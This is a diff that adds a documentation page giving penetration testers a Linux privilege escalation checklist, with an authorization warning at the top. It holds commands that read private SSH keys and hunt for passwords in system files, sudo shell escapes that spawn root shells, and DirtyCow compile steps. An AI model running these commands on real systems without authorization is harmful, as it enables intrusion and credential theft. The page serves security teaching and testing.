@@ -1,0 +1,221 @@
+---
+title: "Linux Basics"
+description: "Foundational Linux concepts, system enumeration, and privilege escalation checklist for penetration testers"
+---
+
+## Overview
+
+Linux is the dominant operating system in server environments, cloud infrastructure, and embedded systems. Understanding its internals is essential for both offensive security and hardening. This page covers the foundational concepts needed before diving into privilege escalation techniques.
+
+<Warning>
+This content is intended for authorized penetration testing, CTF competitions, and security research only. Always obtain proper written authorization before testing any system.
+</Warning>
+
+## Privilege Escalation Checklist
+
+The best automated tool for Linux local privilege escalation enumeration is [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).
+
+### System Information
+
+<Steps>
+  <Step title="Gather OS Information">
+    Identify the operating system, kernel version, and architecture.
+
+    ```bash
+    (cat /proc/version || uname -a) 2>/dev/null
+    lsb_release -a 2>/dev/null
+    cat /etc/os-release 2>/dev/null
+    ```
+  </Step>
+
+  <Step title="Check PATH and Environment">
+    Look for writable folders in PATH and sensitive data in environment variables.
+
+    ```bash
+    echo $PATH
+    (env || set) 2>/dev/null
+    ```
+  </Step>
+
+  <Step title="Search for Kernel Exploits">
+    Check kernel version against known vulnerabilities like DirtyCow.
+
+    ```bash
+    cat /proc/version
+    uname -a
+    searchsploit "Linux Kernel"
+    ```
+  </Step>
+
+  <Step title="Check Sudo Version">
+    Determine if the sudo version is vulnerable to known CVEs.
+
+    ```bash
+    sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
+    ```
+  </Step>
+
+  <Step title="Enumerate Defenses">
+    Identify security mechanisms in place: AppArmor, SELinux, ASLR, etc.
+
+    ```bash
+    # AppArmor
+    if [ `which aa-status 2>/dev/null` ]; then aa-status; fi
+    # SELinux
+    sestatus 2>/dev/null || echo "Not found"
+    # ASLR
+    cat /proc/sys/kernel/randomize_va_space 2>/dev/null
+    ```
+  </Step>
+</Steps>
+
+## Key Checklist Areas
+
+<AccordionGroup>
+  <Accordion title="Drives and Filesystems">
+    - List mounted and unmounted drives
+    - Check `/etc/fstab` for credentials
+    - Look for writable mount points
+
+    ```bash
+    ls /dev 2>/dev/null | grep -i "sd"
+    cat /etc/fstab 2>/dev/null | grep -v "^#"
+    grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
+    ```
+  </Accordion>
+
+  <Accordion title="Installed Software and Processes">
+    - Check for useful and vulnerable software
+    - Monitor running processes for privilege misconfigurations
+
+    ```bash
+    which nmap aws nc ncat netcat wget curl python python3 perl php ruby docker lxc 2>/dev/null
+    dpkg -l    # Debian-based
+    rpm -qa    # CentOS/RHEL
+    ps aux
+    ps -ef
+    ```
+  </Accordion>
+
+  <Accordion title="Scheduled Jobs (Cron)">
+    - Look for writable cron scripts or PATH abuse
+    - Check for wildcard injection opportunities
+
+    ```bash
+    crontab -l
+    ls -al /etc/cron* /etc/at*
+    cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
+    ```
+  </Accordion>
+
+  <Accordion title="Services and Timers">
+    - Check for writable `.service` files
+    - Look for writable binaries executed by services
+    - Enumerate systemd timers
+
+    ```bash
+    systemctl show-environment
+    systemctl list-timers --all
+    ```
+  </Accordion>
+
+  <Accordion title="Sockets and D-Bus">
+    - Identify writable Unix domain sockets
+    - Check for exploitable D-Bus services
+
+    ```bash
+    netstat -a -p --unix
+    nc -U /tmp/socket
+    ```
+  </Accordion>
+
+  <Accordion title="Network Enumeration">
+    - Map the network position and open ports
+    - Check for sniffable traffic
+
+    ```bash
+    cat /etc/hostname /etc/hosts /etc/resolv.conf
+    (ifconfig || ip a)
+    (netstat -punta || ss --ntpu)
+    timeout 1 tcpdump
+    ```
+  </Accordion>
+
+  <Accordion title="Users and Groups">
+    - Enumerate all users, groups, and superusers
+    - Check clipboard and password policy
+
+    ```bash
+    id || (whoami && groups) 2>/dev/null
+    cat /etc/passwd | cut -d: -f1
+    awk -F: '($3 == "0") {print}' /etc/passwd
+    grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
+    ```
+  </Accordion>
+
+  <Accordion title="SUDO and SUID">
+    - Review sudo permissions with GTFOBins
+    - Find exploitable SUID binaries
+
+    ```bash
+    sudo -l
+    find / -perm -4000 2>/dev/null
+    sudo awk 'BEGIN {system("/bin/sh")}'
+    sudo find /etc -exec sh -i \;
+    ```
+  </Accordion>
+
+  <Accordion title="Capabilities and ACLs">
+    - Check for unexpected Linux capabilities
+    - Look for unusual ACLs on files
+
+    ```bash
+    getcap -r / 2>/dev/null
+    getfacl /etc/passwd 2>/dev/null
+    ```
+  </Accordion>
+
+  <Accordion title="SSH and Interesting Files">
+    - Review SSH configuration and keys
+    - Search profile files, shadow, and backup files
+
+    ```bash
+    cat ~/.ssh/id_rsa 2>/dev/null
+    ls -la ~/.ssh/
+    find / -name "*.bak" -o -name "*.old" 2>/dev/null | head -20
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Linux Security Mechanisms
+
+<CardGroup cols={2}>
+  <Card title="AppArmor" icon="shield">
+    Mandatory access control system that restricts program capabilities using per-program profiles.
+  </Card>
+  <Card title="SELinux" icon="lock">
+    Security-Enhanced Linux provides fine-grained mandatory access control policies for processes and files.
+  </Card>
+  <Card title="ASLR" icon="shuffle">
+    Address Space Layout Randomization randomizes memory addresses to mitigate memory exploitation.
+  </Card>
+  <Card title="Capabilities" icon="key">
+    Linux capabilities split root privileges into distinct units that can be independently granted.
+  </Card>
+</CardGroup>
+
+## CVE-2016-5195 (DirtyCow)
+
+A classic kernel privilege escalation vulnerability affecting Linux kernels up to 3.19.0-73.8.
+
+```bash
+# Make DirtyCow stable
+echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+```
+
+## References
+
+- [LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
+- [GTFOBins - Unix binaries for privilege escalation](https://gtfobins.github.io)
+- [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
